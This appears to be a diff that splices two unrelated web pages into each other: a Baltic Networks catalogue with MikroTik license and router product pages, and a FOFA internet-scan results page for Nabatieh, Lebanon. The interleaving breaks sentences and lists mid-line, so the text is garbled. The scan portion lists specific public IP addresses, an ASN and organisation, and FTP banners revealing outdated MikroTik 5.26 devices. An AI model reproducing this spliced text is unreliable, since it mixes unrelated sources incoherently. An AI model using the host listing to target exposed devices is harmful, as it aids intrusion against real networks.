-Wireless Extenders
-Gamma Electronics
-Grandstream Networks .
-Analog Telephone Adapters
-Analog VOIP Gateways
-DECT Cordless IP Phones
-High-End IP Phones
-IP Multimedia Phones
-IP Video Surveillance
-IP PBX Appliances
-Small Business / Home Office IP Phones
-Routing + Wireless
-HotLava Systems
-iDEATRONIK
-IgniteNet.
-Outdoor Wireless
-Indoor Wireless
-Network Switches
-Antennas
-Accessories
-INNO Instrument.
-Cable Antenna Analyzer
-Cleavers
-Fusion Splicers
-OTDR
-Strippers
-Accessories.
-Splice-on Connectors.
-Single-Mode.
-UPC
-APC
-Multi-Mode
-ILSintech.
-Cleavers
-Fusion Splicers
-Preparation Tools
-Accessories
-Connectivity
-ITElite.
-500 MHz Antennas
-700 MHz Antennas
-900 MHz Antennas
-2.4 GHz Antennas
-3.5 GHz Antennas
-5 GHz Antennas
-3x3 MiMO Antennas
-Enclosures
-MiMO Antennas
-Multi-Band Antennas
-Jirous.
-5GHz
-11GHz
-Accessories
-Laird Technologies
-LigoWave.
-2.4 GHz
-3 GHz
-4.9 GHz
-5 GHz
-Microwave
-Antennas
-Accessories
-Mimosa.
-New Mimosa Products
-Access Points
-Backhaul
-CPE
-Point to Multi-Point
-Accessories
-MTI Wireless Edge.
-5GHz Antennas
-900MHz Antennas
-Antenna Accessories
-Parabolic/Grid Antennas
-MorningStar
-Netonix.
-Switches
-Accessories
-Peplink/Pepwave.
-Content Caching Routers
-Enterprise Multi-WAN Routers
-Wi-Fi Access Points
-SOHO Multi-WAN Routers
-Mobile Wi-Fi Routers
-Wi-Fi Client Bridges
-Accessories
-Licensing / Warranties
-Switch
-Polycom
-Primus Cable.
-Cat5 Cable
-Cat6 and Cat7 Cable
-Cat5/Cat6 Connectors
-Fiber.
-Fiber Cable
-Fiber Optic Connectors
-Fiber Pigtails
-Buffer Tubing
-Splice Trays
-Splice Enclosures
-Patch Panels
-Tools
-Patch Panels / Mounting Hardware
-Accessories
-ReadyNet
-RF Elements
-RFS
-SAF.
-Antennas
-CFIP Lumina
-FreeMile
-Integra
-Accessories for SAF
-PhoeniX
-Services
-Shireen
-Siklu.
-EtherHaul 500 Series
-EtherHaul 600 Series
-EtherHaul 1200 Series
-EtherHaul 2200 Series
-EtherHaul 2500 Series
-EtherHaul 5500 Series
-EtherHaul 8000 Series
-MultiHaul Series
-Mounting Kits
-Tenda.
-Access Controller
-Access Points
-CPE
-PON
-Range Extender
-Routers
-Switches
-TP-Link.
-Wireless Access Point
-Wireless Routers
-Ethernet Routers
-Switches
-Antennas
-PoE Splitter/Injectors
-Fiber Modules
-Accessories
-Tycon Systems.
-New Tycon Systems Products
-Tycon Power.
-DC to DC Converters / PoE Inserter
-PoE.
-PoE Active Splitters
-PoE Injectors
-PoE Injector (Mid-span Multi-port)
-PoE Passive Splitters / Injectors
-PoE Switches
-Power Supplies
-Surge Protectors
-Voltage Converters
-Tycon Solar.
-Battery Chargers
-Batteries / Power Bank
-Enclosures
-Remote Power Monitor
-Solar / Wind.
-Solar Kits
-Solar Panels
-Solar Panel Accessories
-Wind Turbines
-UPS Systems.
-RemotePro - Remote Power Systems
-UPSPRO-Solar Ready UPS Systems
-UPSPRO-UPS Systems 120/240VAC
-UPSPRO-UPS Systems for MikroTik and Ubiquiti
-Tycon Wireless.
-Miscellaneous Tycon Wireless
-Weather Stations
-Wireless Access Points
-Yealink.
-Yealink Accessories
-IP Phone
-IP DECT Phone
-IP Video Phone
-Yeastar.
-VoIP Gateways
-IP Phone Systems
-N Series Telephone Systems
-Expansions and Modules
-ZTE
-Complete Solutions.
-MikroTik Solutions.
-MikroTik Complete
-Made for MikroTik
-Powered by MikroTik
-Point to Point.
-2.4Ghz
-4.9Ghz (Public Safety)
-5.8GHz
-3Ghz Range
-11Ghz
-18Ghz
-20-25Ghz Range
-60GHz
-55-90Ghz Range
-Point to Multi Point.
-900Mhz
-2.4Ghz
-5.8GHz
-3Ghz (Licensed)
-60-70Ghz
-3G / 4G Solutions.
-Failover and POS Solutions
-M2M Digital Signage & Kiosks
-802.11AC
-Access Points / Bridges / Base Stations.
-Base Stations
-Bridges
-Enterprise Wi-Fi
-Indoor Access Points
-Outdoor Access Points
-Wireless for Home and Office (SOHO)
-CPE
-Ethernet Routers
-FCC Licensed Radios.
-220MHz
-6Ghz
-10/11Ghz
-18Ghz
-23Ghz
-24Ghz
-70 - 90GHz
-Fiber Routers / Fiber Modules
-Gigabit Routers/Switches
-Hotspot
-Machine to Machine
-Security & Surveillance.
-Data Logging Wind/Weather Stations
-Intercom Systems
-IP Cameras
-Video Recorders
-Switches
-Telephony.
-VOIP Accessories
-Intercoms & Speakers
-PBX Solutions
-Phones
-VoIP Adapters
-VoIP Gateways
-Wireless Routers
-Network Components.
-Promotions.
-Baicells Promotions
-Baltic Swag
-Cambium Promotions
-Gigabit Wireless Headquarters
-Golden MikroTik
-IgniteNet Promotions
-Mimosa Promotions
-Siklu Promotions
-Summer Sale
-Antennas.
-400MHz Range Antennas
-900MHz Range Antennas
-2GHz Range Antennas
-3GHz Range Antennas
-4.9GHz Range Antennas
-5GHz Range Antennas
-10/11GHz Range Antennas
-18GHz Range Antennas
-60GHz and Above Antennas
-Antenna Accessories
-Cellular Antennas
-Dual Polarization Antennas
-Integrated Panel/Enclosure for MikroTik
-Omni-directional
-Parabolic Grid/Dish
-Sector Antennas
-Vehicle Antennas
-Embedded Single Board Computer
-Enclosures & Cases
-Ethernet Cable, Connectors, Tools.
-Ethernet Cable
-Connectors
-Tools
-Fiber.
-Fiber Optic Cable
-Splicers / Cleavers / Strippers
-Sleeves
-Adapters
-Distribution/Terminal Boxes/Splice Enclosures
-Fiber Termination Tool Kit
-PON
-Modules
-Patch Cables
-Fiber Accessories
-Pigtails
-Splitter
-Splice Trays
-Patch Panels
-Splice On Connectors
-IoT
-LTE
-Mounting Hardware.
-Wall Mounts
-Pole Mounts
-Rack Mounts
-Roof Mounts
-Rail Mount
-Network Cards.
-Ethernet Adapters.
-1 Gigabit
-10 Gigabit
-40 Gigabit
-Wireless Cards
-Pigtails & Cable Assemblies
-Power Management.
-Battery Chargers
-Batteries/Power Bank
-Charge/Lighting Controller
-DC to DC Converters/POE Inserters
-Midspan Multiport Power Injectors
-Outdoor UPS Backup Power Systems.
-Solar Ready - POE Powered
-120/240VAC
-Made for MikroTik and Ubiquiti
-PoE Switches
-PoE Active Splitters
-PoE Passive Splitters / Injectors
-Power Injectors
-Power Supplies
-Solar Panels
-Solar Kits
-Solar Remote Power Systems
-Surge Protectors.
-Ethernet
-RF Surge Protectors
-Voltage Converters (non POE)
-Power Cable
-Software Licenses and Branding
-Network Component Accessories
-Accessories for Ubiquiti
-Clearance
-Made For.
-Baicells
-MikroTik
-Cambium
-Mimosa
-Resources.
-Apply for Credit Terms
-FCC Coordination
-Services
-Training
-Webinars
-Consulting
-Technical Support
-Events
-Pre-Configuration
-Custom Branding
-Wireless Calculators
-Equipment Leasing
-Licensed PtP Quote Request
-Home
+===============https://fofa.so/result?qbase64=Y2l0eT0iTmFiYXRpZWgi================
+FOFA Pro - 搜索结果
+问题反馈
+问题反馈关闭
+请详细描述您要反馈的内容
+请留下您的手机号或邮箱，方便我们与您联系(选填)
+验证码
+提交
+规则专题
+API&SDK
+规则列表
+Fofa客户端
+VIP会员
+切换导航
+规则列表
+规则专题
+企业版
+API&SDK
+客户端
+VIP会员
++1积分
+登录与注册
+×Close
+升级到普通会员以上级别用户就可以使用API了。
+https://fofa.so/api/v1/search/all?email=${YOUR_EMAIL}&key=${YOUR_KEY}&qbase64=Y2l0eT0iTmFiYXRpZWgi
+API帮助
+您还可以参考SDK,下载https://github.com/FOFAPRO
+输入错误，请输入正确再查询
+收藏规则
+下载数据
+使用API
+×Close
+Download
+文件正在导出，可在个人中心的下载记录查询文件状态
+数据文件会保存10天,10天后文件可能会被清除,请尽快下载。
+×关闭
+网站正文
+关闭
+正在加载统计信息......
+搜索 city="Nabatieh" 获得 245 条匹配结果 (独立IP数为
+条)， 用时 76 毫秒，模式: extended。
+默认只显示一年内的数据，点击 all 链接查看所有。
+← 上一页 1 2 3 4 5 6 7 … 25 下一页 →
+213.204.78.60
+21
+ftp
+213.204.78.60
+2019-06-25
+Lebanon
 /
-MikroTik RouterOS Level 5 License
-SWL5 - MikroTik RouterOS Level 5 License
-Email to a Friend
-Availability:
-In stock
-Regular Price:
-$95.00
-Special Price:
-$70.00
-Learn more
-Learn more
-MikroTik WISP Level 5 License.
-Click here for license details
-NOTICE:
-You must create an account when checking out.
-Your contact information will be verified and used to send you your license by email so be sure that it is correct. Once verified, your license will be issued within 2 business hours.
-There are no refunds for software license keys.
-NOTICE: This product is available only to the residents of US, Canada and UK.
-Orders by residents of all other countries cannot be fulfilled and when placed, will be cancelled.
-You must select the Device Type you are using in the pull down menu below and enter the Software ID from your router.
-On the command console enter:
-/system license print
-Capture the software ID and enter it below.
-Click here for license details
-RouterOS User Manuals and Technical DocumentationMikroTik Technical Support InformationWhat is RouterOS?RouterOS ManualRouterOS Features
-Not all features may be available due to product hardware configuration.
-The device comes with RouterOS - the operating system, which will turn this powerful system into a highly sophisticated router, firewall or bandwidth manager. RouterOS is a stand-alone operating system based on the Linux v3.3.5 kernel. You can try RouterOS today, go to MikroTik Website for a free-trial demo. The free trial provides all of the features with no limitations. Major features include:
-Firewall:
-Statefull filtering Source and destination NAT NAT helpers (h323, pptp, quake3, sip, ftp, irc, tftp) Internal connection, routing and packet marks Filtering by IP address and address range, port and port range, IP protocol, DSCP and many more Address lists Custom Layer7 matcher IPv6 support PCC - per connection classifier, used in load balancing configurations
-Routing:
-Static routing Virtual Routing and Forwarding (VRF) Policy based routing Interface routing ECMP routing IPv4 dynamic routing protocols: RIP v1/v2, OSPFv2, BGP v4 IPv6 dynamic routing protocols: RIPng, OSPFv3, BGP Bi-directional Forwarding Detection ( BFD)
-MPLS:
-Static Label bindings for IPv4 Label Distribution protocol for IPv4 RSVP Traffic Engineering tunnels VPLS MP-BGP based autodiscovery and signaling MP-BGP based MPLS IP VPN complete list of MPLS features
-VPN:
-Ipsec – tunnel and transport mode, certificate or PSK, AH and ESP security protocols. Hardware encryption support on RouterBOARD 1000. Point to point tunneling (OpenVPN, PPTP, PPPoE, L2TP, SSTP) Advanced PPP features (MLPPP, BCP) Simple tunnels ( IPIP, EoIP) IPv4 andIPv6 support 6 to 4 tunnel support (IPv6 over IPv4 network) VLAN – IEEE802.1q Virtual LAN support, Q-in-Q support MPLS based VPNs
-Wireless:
-IEEE802.11a/b/g wireless client and access point Full IEEE802.11n support Nstreme and Nstreme2 proprietary protocols NV2 protocol Wireless Distribution System (WDS) Virtual AP WEP, WPA, WPA2 Access control list Wireless client roaming WMM HWMP+ Wireless MESH protocol MME wireless routing protocol
-DHCP:
-Per interface DHCP server DHCP client and relay Static and dynamic DHCP leases RADIUS support Custom DHCP options DHCPv6 Prefix Delegation (DHCPv6-PD) DHCPv6 Client Hotspot Plug-n-Play access to the Network Authentication of local Network Clients Users Accounting RADIUS support for Authentication and Accounting
-QoS:
-Hierarchical Token Bucket ( HTB) QoS system with CIR, MIR, burst and priority support Simple and fast solution for basic QoS implementation - Simple queues Dynamic client rate equalization ( PCQ)
-Proxy:
-HTTP caching proxy server Transparent HTTP proxy SOCKS protocol support DNS static entries Support for caching on a separate drive Parent proxy support Access control list Caching list
-Tools:
-Ping, traceroute Bandwidth test, ping flood Packet sniffer, torch Telnet, ssh E-mail and SMS send tools Automated script execution tools CALEA File Fetch tool Advanced traffic generator
-Other features:
-Samba support OpenFlow support Bridging – spanning tree protocol (STP, RSTP), bridge firewall and MAC natting. Dynamic DNS update tool NTP client/server and synchronization with GPS system VRRP v2 and v3 support SNMP M3P - MikroTik Packet packer protocol for wireless links and ethernet MNDP - MikroTik neighbor discovery protocol, supports CDP (Cisco discovery protocol) RADIUS authentication and accounting TFTP server Synchronous interface support (Farsync cards only) (Removed in v5.x) Asynchronous – serial PPP dial-in/dial-out, dial on demand ISDN – dial-in/dial-out, 128K bundle support, Cisco HDLC, x75i, x75ui, x75bui line protocols, dial on demand
-2018 MikroTik Product Catalog
-*Device Type
--- Please Select --RouterBOARD X86 System
-*Software ID (XXXX-XXXX):
-Maximum number of characters: 9
-* Required Fields
-Regular Price:
-$95.00
-Special Price:
-$70.00
-Qty:
-Add to Cart
-Available Services For This Product
-Related Products
-Check items to add to the cart or
-select all
-Additional Information
-Part Number
-MikroTik WISP Level 5 License
-SKU
-SWL5
-Manufacturer
-MikroTik
-HTS Code
-No
-ECCN
-No
-UPC
-No
-x
-Add to Cart
-Price:
-Actual Price:
-Our price is lower than the manufacturer's "minimum advertised price."
-As a result, we cannot show you the price in catalog or the product page.
-You have no obligation to purchase the product once you know the price. You can simply remove the item from your cart.
-Our price is lower than the manufacturer's "minimum advertised price."
-As a result, we cannot show you the price in catalog or the product page.
-You have no obligation to purchase the product once you know the price. You can simply remove the item from your cart.
-Newsletter
-Newsletter Signup
-Facebook
-Twitter
-About Us
-Contact Us
-Our Company
-Careers
-Sitemap
-Service & Support
-Shipping Information
-Order Pickup
-RMA & Warranty
-Terms Of Service
-Safe & Secure Shopping
-Privacy Policy
-Terms & Conditions
-Baltic Networks
-2200 Ogden Ave. - Suite 240
-Lisle, IL 60532 USA
-630-929-3610
-(c). 2019 Baltic Networks, Inc.
-Site Map
-Search Terms
-Advanced Search
-Orders and Returns
-Contact Us
-Request RMA
-Remove This Item
-Continue shopping
-Back to top
-===============https://www.balticnetworks.com/mikrotik-rb1100ahx4-dude-edition.html================
-RB1100AHx4 MikroTik 13-Port Gigabit Router Dude Edition
-JavaScript seems to be disabled in your browser.
-You must have JavaScript enabled in your browser to utilize the functionality of this website.
-Cart
-Checkout
-Login
-Welcome, please log in here
-Baltic Networks Logo
-(888) 929-3610 Affordable Wireless Solutions
-0 products in cart.
-Cart
-Checkout
-You have no items in your shopping cart.
-Catalog
-Search
-Search:
-Catalog
-Home
-Manufacturers.
-Alpha Wireless
-American Tower.
-Free Standing
-Self Supporting.
-Standard Self Supporting
-1810 Self Supporting
-Heavy Duty Self Supporting
-Aranet
-MikroTik.
-New MikroTik Products
-Antennas
-CloudCore Routers
-Enclosures & Cases
-Ethernet Routers
-Power Supplies
-RouterBOARD
-RouterOS License
-Switches
-Wireless Cards
-Wireless for Home and Office (SOHO)
-Wireless Solutions for WISPs
-MikroTik Accessories
-Clearance
-LTE
-Maxxwave.
-New Maxxwave Products
-Antennas and Antenna Accessories
-Enclosures and Rackmount Adapters
-Fiber Modules and Fiber Patch Cables
-Pigtails and Patch Cables
-Power Supplies and PoE Injectors
-RouterMaxx Routers
-UBTik
-Maxxwave Accessories
-Ubiquiti.
-New Ubiquiti Products
-airFiber.
-Radios
-Antennas
-Accessories
-airMAX.
-Antennas.
-airMAX AC Sector Antenna
-airPrism Sector Antenna
-RocketDish Antenna
-RocketDish AC Antenna
-RocketDish LW
-airMAX Sector Antenna
-airMAX Omni Antenna
-airMAX Yagi Antenna
-IsoBeam
-Horn 5 Antenna
-CPE.
-NanoBeam AC
-LiteBeam AC
-NanoStation AC
-PowerBeam AC
-IsoStation AC
-PowerBeam AC ISO
-AP.
-Rocket AC
-LiteBeam AC AP
-Rocket Prism AC
-PrismStation AC
-Accessories
-Legacy.
-IsoStation M
-LiteBeam M5
-NanoBeam M
-NanoBridge M
-NanoStation M
-PowerBridge M
-PowerBeam
-PowerBeam M5 ISO
-Rocket M
-EdgeMax.
-Routing.
-EdgeRouter
-EdgePoint
-EdgeRouter X
-EdgeRouter X SFP
-EdgeRouter Lite
-EdgeRouter PoE
-EdgeRouter PRO
-EdgeRouter Infinity
-EdgeRouter 4
-Switching.
-EtherMagic
-ToughSwitch
-EdgeSwitch
-EdgeSwitch 8-150w
-EdgeSwitch Lite
-EdgeSwitch 12F
-EdgeSwitch 16XG
-Accessories
-U Fiber.
-CPE.
-UFiber Nano G
-UFiber OLT
-Accessories.
-Fiber Modules & Cable
-GPON OLT SFP Transceiver
-PowerModule
-TOUGHCable
-UniFi.
-LED Panel
-Wireless.
-UniFi AP AC LITE
-UniFi AP AC LR
-Routing and Switching
-Accessories
-Legacy
-UniFi Video.
-Accessories
-Cameras
-Accessories for Ubiquiti Products.
-Cable and Connectors
-Wireless Cards
-Power Supplies
-mFi
-Clearance
-Baicells.
-Basestations
-CPEs
-Accessories
-LTE Starter Kits
-BEC Technologies
-Cambium Networks.
-New Cambium Products
-ePMP 1000.
-Antennas
-Radios
-ePMP 2000
-ePMP 3000
-ePMP Force.
-Antennas
-PMP450.
-Access Points
-Antennas
-License Keys
-Subscriber Modules
-PTP450
-PTP 550
-PTP650.
-License Keys
-Extended Warranty
-Connectorized Radio
-Integrated Radio
-PTP820.
-Radios
-PtP Kits
-Extended Warranty
-Activation Key
-cnMatrix
-cnPilot
-cnRanger
-cnReach
-Cambium Accessories
-Cisco Meraki.
-Access Points
-Antennas
-Power Management
-Licenses
-CyberData
-DASAN Zhone Solutions.
-Whole Home WiFi
-Optical Network Terminal (ONT)
-Optical Line Terminal (OLT)
-Network Management
-Accessories
-CPE
-Digital Loggers
-EnGenius.
-Controllers & Switches
-Gateways/Routers
-Indoor Access Points/Bridges
-Outdoor Access Points/Bridges
-Phone Systems
-PoE
-USB Adapters
-Wireless Extenders
-Gamma Electronics
-Grandstream Networks .
-Analog Telephone Adapters
-Analog VOIP Gateways
-DECT Cordless IP Phones
-High-End IP Phones
-IP Multimedia Phones
-IP Video Surveillance
-IP PBX Appliances
-Small Business / Home Office IP Phones
-Routing + Wireless
-HotLava Systems
-iDEATRONIK
-IgniteNet.
-Outdoor Wireless
-Indoor Wireless
-Network Switches
-Antennas
-Accessories
-INNO Instrument.
-Cable Antenna Analyzer
-Cleavers
-Fusion Splicers
-OTDR
-Strippers
-Accessories.
-Splice-on Connectors.
-Single-Mode.
-UPC
-APC
-Multi-Mode
-ILSintech.
-Cleavers
-Fusion Splicers
-Preparation Tools
-Accessories
-Connectivity
-ITElite.
-500 MHz Antennas
-700 MHz Antennas
-900 MHz Antennas
-2.4 GHz Antennas
-3.5 GHz Antennas
-5 GHz Antennas
-3x3 MiMO Antennas
-Enclosures
-MiMO Antennas
-Multi-Band Antennas
-Jirous.
-5GHz
-11GHz
-Accessories
-Laird Technologies
-LigoWave.
-2.4 GHz
-3 GHz
-4.9 GHz
-5 GHz
-Microwave
-Antennas
-Accessories
-Mimosa.
-New Mimosa Products
-Access Points
-Backhaul
-CPE
-Point to Multi-Point
-Accessories
-MTI Wireless Edge.
-5GHz Antennas
-900MHz Antennas
-Antenna Accessories
-Parabolic/Grid Antennas
-MorningStar
-Netonix.
-Switches
-Accessories
-Peplink/Pepwave.
-Content Caching Routers
-Enterprise Multi-WAN Routers
-Wi-Fi Access Points
-SOHO Multi-WAN Routers
-Mobile Wi-Fi Routers
-Wi-Fi Client Bridges
-Accessories
-Licensing / Warranties
-Switch
-Polycom
-Primus Cable.
-Cat5 Cable
-Cat6 and Cat7 Cable
-Cat5/Cat6 Connectors
-Fiber.
-Fiber Cable
-Fiber Optic Connectors
-Fiber Pigtails
-Buffer Tubing
-Splice Trays
-Splice Enclosures
-Patch Panels
-Tools
-Patch Panels / Mounting Hardware
-Accessories
-ReadyNet
-RF Elements
-RFS
-SAF.
-Antennas
-CFIP Lumina
-FreeMile
-Integra
-Accessories for SAF
-PhoeniX
-Services
-Shireen
-Siklu.
-EtherHaul 500 Series
-EtherHaul 600 Series
-EtherHaul 1200 Series
-EtherHaul 2200 Series
-EtherHaul 2500 Series
-EtherHaul 5500 Series
-EtherHaul 8000 Series
-MultiHaul Series
-Mounting Kits
-Tenda.
-Access Controller
-Access Points
-CPE
-PON
-Range Extender
-Routers
-Switches
-TP-Link.
-Wireless Access Point
-Wireless Routers
-Ethernet Routers
-Switches
-Antennas
-PoE Splitter/Injectors
-Fiber Modules
-Accessories
-Tycon Systems.
-New Tycon Systems Products
-Tycon Power.
-DC to DC Converters / PoE Inserter
-PoE.
-PoE Active Splitters
-PoE Injectors
-PoE Injector (Mid-span Multi-port)
-PoE Passive Splitters / Injectors
-PoE Switches
-Power Supplies
-Surge Protectors
-Voltage Converters
-Tycon Solar.
-Battery Chargers
-Batteries / Power Bank
-Enclosures
-Remote Power Monitor
-Solar / Wind.
-Solar Kits
-Solar Panels
-Solar Panel Accessories
-Wind Turbines
-UPS Systems.
-RemotePro - Remote Power Systems
-UPSPRO-Solar Ready UPS Systems
-UPSPRO-UPS Systems 120/240VAC
-UPSPRO-UPS Systems for MikroTik and Ubiquiti
-Tycon Wireless.
-Miscellaneous Tycon Wireless
-Weather Stations
-Wireless Access Points
-Yealink.
-Yealink Accessories
-IP Phone
-IP DECT Phone
-IP Video Phone
-Yeastar.
-VoIP Gateways
-IP Phone Systems
-N Series Telephone Systems
-Expansions and Modules
-ZTE
-Complete Solutions.
-MikroTik Solutions.
-MikroTik Complete
-Made for MikroTik
-Powered by MikroTik
-Point to Point.
-2.4Ghz
-4.9Ghz (Public Safety)
-5.8GHz
-3Ghz Range
-11Ghz
-18Ghz
-20-25Ghz Range
-60GHz
-55-90Ghz Range
-Point to Multi Point.
-900Mhz
-2.4Ghz
-5.8GHz
-3Ghz (Licensed)
-60-70Ghz
-3G / 4G Solutions.
-Failover and POS Solutions
-M2M Digital Signage & Kiosks
-802.11AC
-Access Points / Bridges / Base Stations.
-Base Stations
-Bridges
-Enterprise Wi-Fi
-Indoor Access Points
-Outdoor Access Points
-Wireless for Home and Office (SOHO)
-CPE
-Ethernet Routers
-FCC Licensed Radios.
-220MHz
-6Ghz
-10/11Ghz
-18Ghz
-23Ghz
-24Ghz
-70 - 90GHz
-Fiber Routers / Fiber Modules
-Gigabit Routers/Switches
-Hotspot
-Machine to Machine
-Security & Surveillance.
-Data Logging Wind/Weather Stations
-Intercom Systems
-IP Cameras
-Video Recorders
-Switches
-Telephony.
-VOIP Accessories
-Intercoms & Speakers
-PBX Solutions
-Phones
-VoIP Adapters
-VoIP Gateways
-Wireless Routers
-Network Components.
-Promotions.
-Baicells Promotions
-Baltic Swag
-Cambium Promotions
-Gigabit Wireless Headquarters
-Golden MikroTik
-IgniteNet Promotions
-Mimosa Promotions
-Siklu Promotions
-Summer Sale
-Antennas.
-400MHz Range Antennas
-900MHz Range Antennas
-2GHz Range Antennas
-3GHz Range Antennas
-4.9GHz Range Antennas
-5GHz Range Antennas
-10/11GHz Range Antennas
-18GHz Range Antennas
-60GHz and Above Antennas
-Antenna Accessories
-Cellular Antennas
-Dual Polarization Antennas
-Integrated Panel/Enclosure for MikroTik
-Omni-directional
-Parabolic Grid/Dish
-Sector Antennas
-Vehicle Antennas
-Embedded Single Board Computer
-Enclosures & Cases
-Ethernet Cable, Connectors, Tools.
-Ethernet Cable
-Connectors
-Tools
-Fiber.
-Fiber Optic Cable
-Splicers / Cleavers / Strippers
-Sleeves
-Adapters
-Distribution/Terminal Boxes/Splice Enclosures
-Fiber Termination Tool Kit
-PON
-Modules
-Patch Cables
-Fiber Accessories
-Pigtails
-Splitter
-Splice Trays
-Patch Panels
-Splice On Connectors
-IoT
-LTE
-Mounting Hardware.
-Wall Mounts
-Pole Mounts
-Rack Mounts
-Roof Mounts
-Rail Mount
-Network Cards.
-Ethernet Adapters.
-1 Gigabit
-10 Gigabit
-40 Gigabit
-Wireless Cards
-Pigtails & Cable Assemblies
-Power Management.
-Battery Chargers
-Batteries/Power Bank
-Charge/Lighting Controller
-DC to DC Converters/POE Inserters
-Midspan Multiport Power Injectors
-Outdoor UPS Backup Power Systems.
-Solar Ready - POE Powered
-120/240VAC
-Made for MikroTik and Ubiquiti
-PoE Switches
-PoE Active Splitters
-PoE Passive Splitters / Injectors
-Power Injectors
-Power Supplies
-Solar Panels
-Solar Kits
-Solar Remote Power Systems
-Surge Protectors.
-Ethernet
-RF Surge Protectors
-Voltage Converters (non POE)
-Power Cable
-Software Licenses and Branding
-Network Component Accessories
-Accessories for Ubiquiti
-Clearance
-Made For.
-Baicells
-MikroTik
-Cambium
-Mimosa
-Resources.
-Apply for Credit Terms
-FCC Coordination
-Services
-Training
-Webinars
-Consulting
-Technical Support
-Events
-Pre-Configuration
-Custom Branding
-Wireless Calculators
-Equipment Leasing
-Licensed PtP Quote Request
-Home
+Nabatieh
+ASN:
+39010
+组织:
+TerraNet sal
+220 MikroTik FTP server (MikroTik 5.26) ready
+331 Password required for anonymous
+213.204.78.139
+21
+ftp
+213.204.78.139
+2019-06-25
+Lebanon
 /
-MikroTik RB1100AHx4 13-Port Gigabit Router Dude Edition
-RB1100AHx4 Dude Edition - MikroTik RB1100AHx4 13-Port Gigabit Router Dude Edition
-Email to a Friend
-Availability:
-In stock
-Regular Price:
-$349.00
-Special Price:
-$297.50
-Qty:
-Add to Cart
-Learn more
-Learn more
-MikroTik RB1100AHx4 Dude Edition uses a quad-core Cortex A15 chip from Annapurna labs. It's clocked at 1.4GHz, for a maximum throughput of up to 7.5Gbit. The unit features several high speed storage (two SATA and two M.2) for using a Dude database, proxy cache, or any other storage intensive features. It includes a 60GB M.2 drive and comes with Dude package already installed, ready to work out of the box.
-Includes two IEC failover power connectors, supports passive or 802.3at/af PoE input and has a DC telecom power connector for -48VDC powering.
-Product Specifications
-• CPU: AL21400, 4 cores, 1.4GHz
-• Size of RAM: 1GB
-• Storage Type: NAND
-• Storage Size: 128MB + 60GB M.2 SATA 3 drive included
-• 10/100/1000 Ethernet ports: 13
-• Ethernet Bypass: Ethernet 11/12
-• Power Jack: 2 x IEC. 100 - 240V
-• DC Telecom Power: 20 - 57V (-48V supported)
-• PoE Input: Passive, 802.3at 20-57V
-• Redundant Power Supply: Yes
-• Voltage Monitor: Yes
-• PCB Temperature Monitor: Yes
-• Current Monitor: Yes
-• Dimensions: 444 x 148 x 47mm
-• Operating System: RouterOS, level 6 license
-• Max. Power Consumption: 25W
-• microSD: 1
-• SATA: 2 x 2.5" SATA 3
-• M.2 Slots: 2 x SATA 3 compatible (supports 2242, 2260, 2280 sizes, M-key)
-• Serial Port: RS232
-• Beeper: Yes
-Product Includes:
-• (1) RB1100AHx4 Dude Edition
-• (2) SATA Cables
-• (1) K-46 Screw Kit
-• (2) Rack Ears
-• (2) IEC Cords
-Product Documentation
-RB1100AHx4 Dude Edition Datasheet
-RouterOS User Manuals and Technical DocumentationMikroTik Technical Support InformationWhat is RouterOS?RouterOS ManualRouterOS Features
-Not all features may be available due to product hardware configuration.
-The device comes with RouterOS - the operating system, which will turn this powerful system into a highly sophisticated router, firewall or bandwidth manager. RouterOS is a stand-alone operating system based on the Linux v3.3.5 kernel. You can try RouterOS today, go to MikroTik Website for a free-trial demo. The free trial provides all of the features with no limitations. Major features include:
-Firewall:
-Statefull filtering Source and destination NAT NAT helpers (h323, pptp, quake3, sip, ftp, irc, tftp) Internal connection, routing and packet marks Filtering by IP address and address range, port and port range, IP protocol, DSCP and many more Address lists Custom Layer7 matcher IPv6 support PCC - per connection classifier, used in load balancing configurations
-Routing:
-Static routing Virtual Routing and Forwarding (VRF) Policy based routing Interface routing ECMP routing IPv4 dynamic routing protocols: RIP v1/v2, OSPFv2, BGP v4 IPv6 dynamic routing protocols: RIPng, OSPFv3, BGP Bi-directional Forwarding Detection ( BFD)
-MPLS:
-Static Label bindings for IPv4 Label Distribution protocol for IPv4 RSVP Traffic Engineering tunnels VPLS MP-BGP based autodiscovery and signaling MP-BGP based MPLS IP VPN complete list of MPLS features
-VPN:
-Ipsec – tunnel and transport mode, certificate or PSK, AH and ESP security protocols. Hardware encryption support on RouterBOARD 1000. Point to point tunneling (OpenVPN, PPTP, PPPoE, L2TP, SSTP) Advanced PPP features (MLPPP, BCP) Simple tunnels ( IPIP, EoIP) IPv4 andIPv6 support 6 to 4 tunnel support (IPv6 over IPv4 network) VLAN – IEEE802.1q Virtual LAN support, Q-in-Q support MPLS based VPNs
-Wireless:
-IEEE802.11a/b/g wireless client and access point Full IEEE802.11n support Nstreme and Nstreme2 proprietary protocols NV2 protocol Wireless Distribution System (WDS) Virtual AP WEP, WPA, WPA2 Access control list Wireless client roaming WMM HWMP+ Wireless MESH protocol MME wireless routing protocol
-DHCP:
-Per interface DHCP server DHCP client and relay Static and dynamic DHCP leases RADIUS support Custom DHCP options DHCPv6 Prefix Delegation (DHCPv6-PD) DHCPv6 Client Hotspot Plug-n-Play access to the Network Authentication of local Network Clients Users Accounting RADIUS support for Authentication and Accounting
-QoS:
-Hierarchical Token Bucket ( HTB) QoS system with CIR, MIR, burst and priority support Simple and fast solution for basic QoS implementation - Simple queues Dynamic client rate equalization ( PCQ)
-Proxy:
-HTTP caching proxy server Transparent HTTP proxy SOCKS protocol support DNS static entries Support for caching on a separate drive Parent proxy support Access control list Caching list
-Tools:
-Ping, traceroute Bandwidth test, ping flood Packet sniffer, torch Telnet, ssh E-mail and SMS send tools Automated script execution tools CALEA File Fetch tool Advanced traffic generator
-Other features:
-Samba support OpenFlow support Bridging – spanning tree protocol (STP, RSTP), bridge firewall and MAC natting. Dynamic DNS update tool NTP client/server and synchronization with GPS system VRRP v2 and v3 support SNMP M3P - MikroTik Packet packer protocol for wireless links and ethernet MNDP - MikroTik neighbor discovery protocol, supports CDP (Cisco discovery protocol) RADIUS authentication and accounting TFTP server Synchronous interface support (Farsync cards only) (Removed in v5.x) Asynchronous – serial PPP dial-in/dial-out, dial on demand ISDN – dial-in/dial-out, 128K bundle support, Cisco HDLC, x75i, x75ui, x75bui line protocols, dial on demand
-2018 MikroTik Product Catalog
-More Views
-Available Services For This Product
-Related Products
-Check items to add to the cart or
-select all
-Learn RouterOS - Second Edition by Dennis Burgess
-Regular Price:
-$54.95
-Special Price:
-$47.75
